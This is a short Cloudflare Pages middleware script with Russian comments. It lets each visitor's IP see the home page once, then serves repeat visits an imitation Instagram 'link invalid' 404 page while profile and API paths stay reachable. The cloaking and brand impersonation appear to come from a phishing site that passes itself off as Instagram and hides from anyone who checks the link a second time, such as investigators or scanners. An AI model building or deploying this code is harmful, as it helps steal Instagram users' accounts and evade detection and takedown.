export async function onRequest(context) {
  try {
    const { request, env, next } = context;
    const ip = request.headers.get('CF-Connecting-IP') || 'unknown';
    const url = new URL(request.url);
    const path = url.pathname;

    // Пропускаем статику
    if (path.match(/\.(css|js|jpg|jpeg|png|gif|svg|woff|woff2|ttf|ico)$/)) {
      return next();
    }

    // Пропускаем API
    if (path.startsWith('/api/')) {
      return next();
    }

    // Пропускаем profile.html — это часть первого визита
    if (path === '/profile.html' || path === '/profile') {
      return next();
    }

    // Блокируем ТОЛЬКО главную (/) при повторном визите
    const isHome = (path === '/' || path === '/index.html');

    if (isHome) {
      const seen = await env.IPS.get(ip);

      if (seen) {
        // Второй визит на главную — блок
        return new Response(`
          <!DOCTYPE html>
          <html lang="ru">
          <head>
            <meta charset="UTF-8">
            <title>Ссылка недействительна • Instagram</title>
            <style>
              body { background:#000; color:#f5f5f5; font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif; display:flex; justify-content:center; align-items:center; min-height:100vh; margin:0; padding:20px; text-align:center; }
              .container { max-width:400px; }
              .logo { font-family:"Billabong",cursive,sans-serif; font-size:48px; margin-bottom:40px; background:linear-gradient(45deg,#f09433,#e6683c,#dc2743,#cc2366,#bc1888); -webkit-background-clip:text; -webkit-text-fill-color:transparent; }
              h1 { font-size:24px; margin-bottom:12px; font-weight:600; }
              p { color:#a8a8a8; font-size:14px; line-height:1.5; }
              a { color:#0095f6; text-decoration:none; font-size:14px; font-weight:600; }
            </style>
          </head>
          <body>
            <div class="container">
              <div class="logo">Instagram</div>
              <h1>Ссылка недействительна</h1>
              <p>Возможно, ссылка устарела, или страница была удалена.</p>
              <p style="margin-top:20px;"><a href="https://www.instagram.com/">Вернуться в Instagram</a></p>
            </div>
          </body>
          </html>
        `, {
          status: 404,
          headers: { 'Content-Type': 'text/html; charset=utf-8' }
        });
      }

      // Первый визит — записываем IP
      await env.IPS.put(ip, new Date().toISOString(), { expirationTtl: 60 * 60 * 24 * 30 });
    }

    return next();
  } catch (e) {
    return new Response('ERROR: ' + e.message, { status: 500 });
  }
}
